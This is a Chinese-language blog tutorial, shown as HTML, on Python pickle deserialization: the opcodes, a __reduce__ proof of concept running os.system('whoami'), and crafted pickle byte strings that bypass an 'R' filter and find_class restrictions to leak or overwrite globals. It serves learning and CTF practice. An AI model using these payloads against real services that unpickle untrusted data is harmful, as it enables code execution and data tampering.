@@ -1,0 +1,502 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="小喇叭">
+  <meta name="keywords" content="">
+  <title>python反序列化学习 - 小喇叭</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>xiaolaba's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="python反序列化学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-06-07 11:27" pubdate>
+        2020年6月7日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      17
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">python反序列化学习</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>python的序列化和反序列化主要有两个模块，json和pickle模块</p>
+<p>json：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json <br><br>a = &#123;<span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;kobe&#x27;</span>&#125;<br>s = json.dumps(a)<br>print(s)<br>b = json.loads(s)<br>print(b)<br><br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/06/07/Bpn4e9hFQLk6jvP.png" srcset="/img/loading.gif"></p>
+<p>pickle:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-comment">#a = &#x27;test,test,test&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.name = <span class="hljs-string">&#x27;kobe&#x27;</span><br>a = test()<br>s = pickle.dumps(a,protocol = <span class="hljs-number">3</span>)<br>print(s)<br>b = pickle.loads(s)<br>print(b.name)<br><br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/06/07/PaKMviqjp4JUTRb.png" srcset="/img/loading.gif"></p>
+<p>可以看到，使用pickle序列化后的结果，不像json那样可读了，这是可以用上pickle的调节器 pickeletools.</p>
+<p>pickletools有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种。对应的方法是 dis()和optimize()<img src="https://i.loli.net/2020/06/07/4BICVZ2a6kmGHg3.png" srcset="/img/loading.gif"></p>
+<p>调用pickle.dumps()，里面的第二参数protocol代表协议，pickle支持4个协议，其中0号协议是人能看懂的协议，其他的协议对序列化进行了优化，也使序列化后的结果不再可读（默认使用3号协议）</p>
+<p>下面使用3号协议，分析一下序列化后，字串里的内容的含义。</p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>打开python里pickle.py，看一下源码</p>
+<p>先看看调用的方法 dump和load(文件) dumps和loads()</p>
+<p><img src="https://i.loli.net/2020/06/07/ZaoqlCS5KyMOdTD.png" srcset="/img/loading.gif"></p>
+<p>可以看到都是调用了__Pickler类的dump和load方法。</p>
+<p>再看看序列化后各字符的含义（太长，只截一部分）</p>
+<p><img src="https://i.loli.net/2020/06/07/VAymbteLs1f3GSj.png" srcset="/img/loading.gif"></p>
+<p>我们使用pickletools把上面序列化的结果作简化后试着分析一下。</p>
+<p><img src="https://i.loli.net/2020/06/07/4BICVZ2a6kmGHg3.png" srcset="/img/loading.gif"></p>
+<p>\x80：2号协议引入的东西，表示使用的协议号，这里是3号协议，因此写着3</p>
+<p>c :  读取两个字符串（用\n分割）分别表示moudle和name,使用的是find_class(moudle,name)方法</p>
+<p>) : 把一个空tuple压入栈</p>
+<p>\x81 : 弹出栈中的tuple和class,使用cls.__new__(cls,*args),实例化一个类对象,再把结果压入栈</p>
+<p>} : 把一个空dict压入栈</p>
+<p>( : 将当前栈的内容放入前序栈中.   {前序栈保存了程序运行至今的（不在顶层的）完整的栈信息，而当前栈专注于处 理顶层的事件.}</p>
+<p>X : 读取UTF-8字符串，以\n为结束</p>
+<p>u : 将当前栈的内容存在一个数组里，将前序栈的内容拿出，恢复当前栈</p>
+<p>s : 将刚才的数组里的内容以 key : value的方式，赋给栈顶的dict</p>
+<p>b : 调用 __setstate__ or__dict__.update()</p>
+<p>. : 结束</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a>__reduce__</h3><ul>
+<li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li>
+<li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li>
+<li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li>
+</ul>
+<p>测试:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#a = &#x27;test,test,test&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.name = &#123;<span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;kobe&#x27;</span>,<span class="hljs-string">&#x27;points&#x27;</span>:<span class="hljs-string">&#x27;81&#x27;</span>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;whoami&#x27;</span>,))<br><br>a = test()<br>s = pickle.dumps(a)<br>s = pickletools.optimize(s)<br>print(s)<br>b = pickle.loads(s)<br><br></code></pre></td></tr></table></figure>
+<p>成功执行了whoami(这里无论本来的类中是否存在__reduce__方法都会执行)</p>
+<p><img src="https://i.loli.net/2020/06/07/k9hjz48A1WmBOn2.png" srcset="/img/loading.gif"></p>
+<h2 id="0x04-绕过-reduce-限制"><a href="#0x04-绕过-reduce-限制" class="headerlink" title="0x04 绕过__reduce__限制"></a>0x04 绕过__reduce__限制</h2><h4 id="1-使用黑名单限制可执行的函数"><a href="#1-使用黑名单限制可执行的函数" class="headerlink" title="1)使用黑名单限制可执行的函数"></a>1)使用黑名单限制可执行的函数</h4><p>这种限制往往不会有很好的效果，因为一不小心就会有漏网之鱼可以利用。</p>
+<p>常见的绕过是使用map() 但是似乎python3 map()返回的是迭代器，还要使用next()才能得到结果，不知道怎么利用了。</p>
+<h4 id="2-直接过滤了R"><a href="#2-直接过滤了R" class="headerlink" title="2) 直接过滤了R"></a>2) 直接过滤了R</h4><p>__reduce__完全不能使用了，需要想其他的方法利用</p>
+<h5 id="c-指令码的妙用"><a href="#c-指令码的妙用" class="headerlink" title="c 指令码的妙用"></a>c 指令码的妙用</h5><p>问题假设： 有两个字符串 name和points 用户无法得知内容，先要求我们传进的内容反序列后的值要和设定好的name和points相同</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle <br><span class="hljs-keyword">import</span> base64<br><br>secrte_name = <span class="hljs-string">&#x27;kobe&#x27;</span><br>secrte_points = <span class="hljs-string">&#x27;81&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">player</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name,points</span>):</span><br>        self.name = name<br>        self.points = points<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-params">self,other</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> player <span class="hljs-keyword">and</span> self.name ==other.name <span class="hljs-keyword">and</span> self.points == other.points<br><br>print(pickle.dumps(player(secrte_name,secrte_points)))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">data</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no no no&quot;</span><br>    <span class="hljs-keyword">else</span> :<br>        x = pickle.loads(data)<br>        <span class="hljs-keyword">if</span>(x !=player(secrte_name,secrte_points)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wrong&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;you got me&quot;</span><br><br><br><br>print(check(base64.b64decode(<span class="hljs-built_in">input</span>())))<br><br></code></pre></td></tr></table></figure>
+
+
+<p>解法：</p>
+<p>利用c指令码，获取全局参数，从而得到secrte值（过程中我们并不知道secrte的值）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;\x80\x03c__main__\nplayer\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x05\x00\x00\x00curryq\x04X\x06\x00\x00\x00pointsq\x05X\x02\x00\x00\x0060q\x06ub.&#x27;<br></code></pre></td></tr></table></figure>
+<p>替换成</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;\x80\x03c__main__\nplayer\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03c__main__\nsecrte_name\nq\x04X\x06\x00\x00\x00pointsq\x05c__main__\npoints\nq\x06ub.&#x27;<br></code></pre></td></tr></table></figure>
+<p>base64加密后传进去</p>
+<p><img src="C:\Users\劳锦伦\AppData\Roaming\Typora\typora-user-images\image-20200607163017640.png" srcset="/img/loading.gif" alt="image-20200607163017640"></p>
+<h4 id="3-绕过c指令限制"><a href="#3-绕过c指令限制" class="headerlink" title="3)绕过c指令限制"></a>3)绕过c指令限制</h4><p>前面说过，c指令调用的是find_class函数，若这个函数被改了只能读取某些module时，该怎么利用呢？</p>
+<p>答案是先读入，后篡改 </p>
+<p>先利用一段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;c__main__\nplay\n&#125;(Vname\nVcurry\nVpoints\nV60\nub0&#x27;<br></code></pre></td></tr></table></figure>
+<p>读入我们设定好的值，再反序列化后，原本play.name和play.points就改成了我们想要的值。最后的0是将该dict弹出栈，这样后面的操作就不会应该到这一段了。</p>
+<p>后面就是正常的反序列化</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">b&#x27;\x80\x03c__main__\nplay\n&#125;(Vname\nVcurry\nVpoints\nV60\nub0\x80\x03c__main__\nplayer\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x05\x00\x00\x00curryq\x04X\x06\x00\x00\x00pointsq\x05X\x02\x00\x00\x0060q\x06ub.&#x27;<br></code></pre></td></tr></table></figure>
+
+
+
+
+<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">python反序列化</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-%E5%BD%A9%E8%9B%8B/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JAVA反序列化题目-强网杯 2018 彩蛋</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/06/06/tp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="hidden-mobile">tp6.0.x反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
